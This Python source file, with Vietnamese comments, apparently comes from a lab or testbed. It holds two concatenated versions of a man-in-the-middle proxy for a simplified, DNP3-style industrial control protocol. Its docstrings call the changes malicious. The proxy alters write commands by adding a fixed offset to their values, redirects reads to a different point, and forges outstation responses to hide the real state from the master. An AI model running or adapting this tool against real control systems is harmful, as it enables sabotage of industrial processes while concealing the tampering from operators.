import argparse
import json
import logging
import socket
import threading
import time
from typing import Any, Dict, Tuple


LOG_FORMAT = "%(asctime)s [DNP3_PROXY] %(levelname)s: %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger("dnp3_data_mod_proxy")

BUFFER_SIZE = 4096


def modify_frame_from_master(frame: Dict[str, Any]) -> Tuple[Dict[str, Any], bool]:
    """
    Áp dụng chính sách sửa đổi độc hại cho các frame đi từ master -> outstation.

    Ví dụ:
    - Với WRITE tới bất kỳ point nào, tăng giá trị thêm +100 để làm sai lệch điều khiển.
    - Với READ, có thể đổi point_id (ví dụ 0 -> 1) để master đọc nhầm điểm.
    """
    modified = dict(frame)
    changed = False

    if modified.get("type") == "WRITE":
        value = modified.get("value")
        if isinstance(value, (int, float)):
            modified["value"] = value + 100
            changed = True
    elif modified.get("type") == "READ":
        point_id = modified.get("point_id")
        if isinstance(point_id, int) and point_id == 0:
            modified["point_id"] = 1
            changed = True

    return modified, changed


def modify_frame_from_outstation(frame: Dict[str, Any]) -> Tuple[Dict[str, Any], bool]:
    """
    (Tùy chọn) Sửa các frame phản hồi từ outstation -> master để che giấu trạng thái thật.

    Ví dụ:
    - Với READ_RESPONSE/WRITE_RESPONSE có value số, ép giá trị về một hằng số “an toàn”.
    """
    modified = dict(frame)
    changed = False

    if modified.get("type") in ("READ_RESPONSE", "WRITE_RESPONSE"):
        value = modified.get("value")
        if isinstance(value, (int, float)):
            modified["value"] = 42
            changed = True

    return modified, changed


 # Luồng chuyển tiếp hai chiều: đọc JSON-line từ src_sock, có thể sửa frame rồi gửi tiếp sang dst_sock.
def forward_stream(
    src_sock: socket.socket,
    dst_sock: socket.socket,
    direction: str,
) -> None:
    """
    Forward JSON line frames between sockets, applying modifications based on direction.
    direction: "master_to_outstation" or "outstation_to_master".
    """
    buf = b""
    while True:
        try:
            data = src_sock.recv(BUFFER_SIZE)
            if not data:
                logger.info("%s: upstream closed connection", direction)
                break
            buf += data
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                if not line.strip():
                    continue
                raw = line.decode("utf-8")
                try:
                    frame = json.loads(raw)
                except json.JSONDecodeError:
                    logger.warning("%s: invalid JSON frame: %s", direction, raw)
                    dst_sock.sendall(line + b"\n")
                    continue

                if direction == "master_to_outstation":
                    modified, changed = modify_frame_from_master(frame)
                else:
                    modified, changed = modify_frame_from_outstation(frame)

                if changed:
                    logger.warning(
                        "%s: modified frame\n  original=%s\n  modified=%s",
                        direction,
                        frame,
                        modified,
                    )
                else:
                    logger.info("%s: forwarding frame %s", direction, frame)

                out_raw = json.dumps(modified).encode("utf-8") + b"\n"
                dst_sock.sendall(out_raw)
        except (ConnectionResetError, OSError) as exc:
            logger.info("%s: connection error: %s", direction, exc)
            break
        except Exception as exc:  # noqa: BLE001
            logger.exception("%s: unexpected error: %s", direction, exc)
            break


 # Xử lý một kết nối master: tạo kết nối tới outstation và khởi động hai luồng forward_stream song song.
def handle_client(
    client_sock: socket.socket,
    client_addr: Any,
    outstation_host: str,
    outstation_port: int,
) -> None:
    logger.info(
        "Accepted master connection from %s:%d, connecting to outstation %s:%d",
        *client_addr,
        outstation_host,
        outstation_port,
    )
    with client_sock:
        try:
            with socket.create_connection((outstation_host, outstation_port), timeout=5.0) as out_sock:
                logger.info("Connected to outstation from proxy")

                t1 = threading.Thread(
                    target=forward_stream,
                    args=(client_sock, out_sock, "master_to_outstation"),
                    daemon=True,
                )
                t2 = threading.Thread(
                    target=forward_stream,
                    args=(out_sock, client_sock, "outstation_to_master"),
                    daemon=True,
                )
                t1.start()
                t2.start()
                t1.join()
                t2.join()
        except (ConnectionRefusedError, TimeoutError, OSError) as exc:
            logger.error("Failed to connect from proxy to outstation: %s", exc)


 # Hàm main logic cho proxy MITM: lắng nghe master, mỗi kết nối mới sẽ được gắn với một phiên tới outstation.
def run_proxy(
    listen_host: str,
    listen_port: int,
    outstation_host: str,
    outstation_port: int,
) -> None:
    logger.info(
        "Starting DNP3 data modification proxy on %s:%d -> %s:%d",
        listen_host,
        listen_port,
        outstation_host,
        outstation_port,
    )
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_sock:
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((listen_host, listen_port))
        server_sock.listen(5)

        while True:
            try:
                client_sock, addr = server_sock.accept()
            except KeyboardInterrupt:
                logger.info("Stopping proxy (KeyboardInterrupt)")
                break
            except Exception as exc:  # noqa: BLE001
                logger.error("Error accepting master connection: %s", exc)
                time.sleep(1.0)
                continue

            threading.Thread(
                target=handle_client,
                args=(client_sock, addr, outstation_host, outstation_port),
                daemon=True,
            ).start()


 # Hàm main (phiên bản 1) đọc tham số CLI và khởi chạy proxy kiểu data_modification.
def main() -> None:
    parser = argparse.ArgumentParser(
        description="DNP3-style TCP proxy that modifies data in-transit between master and outstation.",
    )
    parser.add_argument(
        "--listen-host",
        default="127.0.0.1",
        help="Host for proxy to listen for master connections.",
    )
    parser.add_argument(
        "--listen-port",
        type=int,
        default=21000,
        help="Port for proxy to listen for master connections.",
    )
    parser.add_argument(
        "--outstation-host",
        default="127.0.0.1",
        help="Real outstation host to forward traffic to.",
    )
    parser.add_argument(
        "--outstation-port",
        type=int,
        default=20000,
        help="Real outstation port to forward traffic to.",
    )
    args = parser.parse_args()

    try:
        run_proxy(
            listen_host=args.listen_host,
            listen_port=args.listen_port,
            outstation_host=args.outstation_host,
            outstation_port=args.outstation_port,
        )
    except KeyboardInterrupt:
        logger.info("Proxy stopped by user.")


if __name__ == "__main__":
    main()

import argparse
import json
import logging
import socket
import threading
import time
from typing import Any, Dict, Tuple


LOG_FORMAT = "%(asctime)s [%(levelname)s] [DNP3Proxy] %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger(__name__)

BUFFER_SIZE = 4096


def modify_master_to_outstation(frame: Dict[str, Any]) -> Dict[str, Any]:
    """
    Thay đổi frame đi từ master -> outstation.
    Ví dụ: nếu là WRITE tới point 1 thì cộng thêm +50 vào giá trị.
    """
    if frame.get("type") == "WRITE" and frame.get("point_id") == 1:
        original_value = frame.get("value")
        try:
            new_value = int(original_value) + 50
        except (TypeError, ValueError):
            new_value = original_value
        logger.warning(
            "[PROXY] Modifying WRITE to point 1: %s -> %s",
            original_value,
            new_value,
        )
        frame["value"] = new_value
    return frame


def modify_outstation_to_master(frame: Dict[str, Any]) -> Dict[str, Any]:
    """
    Thay đổi frame đi từ outstation -> master.
    Ví dụ: với READ_RESPONSE của point 0 thì luôn ép value về 0.
    """
    if frame.get("type") == "READ_RESPONSE" and frame.get("point_id") == 0:
        original_value = frame.get("value")
        logger.warning(
            "[PROXY] Faking READ_RESPONSE for point 0: %s -> 0",
            original_value,
        )
        frame["value"] = 0
    return frame


 # Vòng lặp chuyển tiếp chung: ghép từng dòng JSON, parse, sửa frame theo chiều rồi gửi sang socket đối diện.
def forward_loop(
    src: socket.socket,
    dst: socket.socket,
    direction: str,
) -> None:
    """
    Forward JSON-line frames from src to dst, possibly modifying them.
    """
    buf = b""
    while True:
        try:
            data = src.recv(BUFFER_SIZE)
            if not data:
                break
            buf += data
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                if not line.strip():
                    continue
                raw = line.decode("utf-8")
                try:
                    frame = json.loads(raw)
                except json.JSONDecodeError:
                    logger.warning("[%s] Invalid JSON frame: %s", direction, raw)
                    continue

                if direction == "master->outstation":
                    frame = modify_master_to_outstation(frame)
                else:
                    frame = modify_outstation_to_master(frame)

                out_raw = json.dumps(frame).encode("utf-8") + b"\n"
                dst.sendall(out_raw)
        except ConnectionResetError:
            break
        except Exception as exc:  # noqa: BLE001
            logger.exception("[%s] Error in forward loop: %s", direction, exc)
            break


 # Xử lý một phiên master–proxy–outstation: tạo kết nối tới outstation và chạy hai forward_loop hai chiều.
def handle_connection(
    client_sock: socket.socket,
    outstation_addr: Tuple[str, int],
) -> None:
    with client_sock:
        try:
            with socket.create_connection(outstation_addr, timeout=5.0) as out_sock:
                logger.info("Connected to outstation at %s:%d", *outstation_addr)

                t1 = threading.Thread(
                    target=forward_loop,
                    args=(client_sock, out_sock, "master->outstation"),
                    daemon=True,
                )
                t2 = threading.Thread(
                    target=forward_loop,
                    args=(out_sock, client_sock, "outstation->master"),
                    daemon=True,
                )
                t1.start()
                t2.start()

                t1.join()
                t2.join()
        except Exception as exc:  # noqa: BLE001
            logger.exception("Error in proxy handler: %s", exc)


 # Hàm run_proxy (phiên bản 2) lắng nghe kết nối từ master và tạo thread mới cho mỗi phiên kết nối.
def run_proxy(
    listen_host: str,
    listen_port: int,
    outstation_host: str,
    outstation_port: int,
) -> None:
    logger.info(
        "Starting DNP3 data modification proxy on %s:%d -> %s:%d",
        listen_host,
        listen_port,
        outstation_host,
        outstation_port,
    )
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_sock:
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((listen_host, listen_port))
        server_sock.listen(5)
        while True:
            try:
                client_sock, addr = server_sock.accept()
                logger.info("Accepted master connection from %s:%d", *addr)
                threading.Thread(
                    target=handle_connection,
                    args=(client_sock, (outstation_host, outstation_port)),
                    daemon=True,
                ).start()
            except KeyboardInterrupt:
                logger.info("Stopping proxy (KeyboardInterrupt).")
                break


 # Hàm main (phiên bản 2) đọc tham số CLI và khởi động proxy man-in-the-middle.
def main() -> None:
    parser = argparse.ArgumentParser(
        description="DNP3 data modification proxy (man-in-the-middle).",
    )
    parser.add_argument(
        "--listen-host",
        default="127.0.0.1",
        help="Host to listen for master connections.",
    )
    parser.add_argument(
        "--listen-port",
        type=int,
        default=21000,
        help="Port to listen for master connections.",
    )
    parser.add_argument(
        "--outstation-host",
        default="127.0.0.1",
        help="Real outstation host.",
    )
    parser.add_argument(
        "--outstation-port",
        type=int,
        default=20000,
        help="Real outstation port.",
    )
    args = parser.parse_args()

    run_proxy(
        listen_host=args.listen_host,
        listen_port=args.listen_port,
        outstation_host=args.outstation_host,
        outstation_port=args.outstation_port,
    )


if __name__ == "__main__":
    main()

